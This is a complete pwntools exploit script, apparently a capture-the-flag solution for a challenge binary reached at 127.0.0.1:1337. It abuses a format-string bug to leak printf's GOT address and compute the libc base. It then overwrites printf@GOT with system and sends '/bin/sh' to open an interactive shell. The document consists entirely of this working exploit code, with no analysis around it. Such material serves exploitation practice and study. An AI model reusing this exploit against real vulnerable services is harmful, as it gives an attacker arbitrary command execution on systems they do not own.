from pwn import *
import time

context.arch = 'amd64'
context.log_level = 'info'

# p = process(['./dist/ld-linux-x86-64.so.2', '--library-path', './dist', './dist/chall'])
p = remote("127.0.0.1", 1337)
elf = ELF('./dist/chall')
libc = ELF('./dist/libc.so.6')

printf_got = elf.got['printf']
log.info(f"printf@GOT: {hex(printf_got)}")

# Step 1: Leak printf@GOT via %s
payload = b'%7$sAAAA' + p64(printf_got)
p.sendline(payload)
resp = p.recvuntil(b'AAAA')
printf_addr = u64(resp[:-4][:6].ljust(8, b'\x00'))
log.info(f"printf addr: {hex(printf_addr)}")

libc.address = printf_addr - libc.symbols['printf']
system_addr = libc.symbols['system']
log.info(f"libc base: {hex(libc.address)}")
log.info(f"system: {hex(system_addr)}")

# Step 2: Overwrite printf@GOT with system
payload = fmtstr_payload(6, {printf_got: system_addr}, write_size='byte')
p.sendline(payload)
time.sleep(0.3)

# Step 3: Execute command via system()
# printf(buf) -> system(buf) after GOT overwrite
p.sendline(b'/bin/sh')
p.interactive()
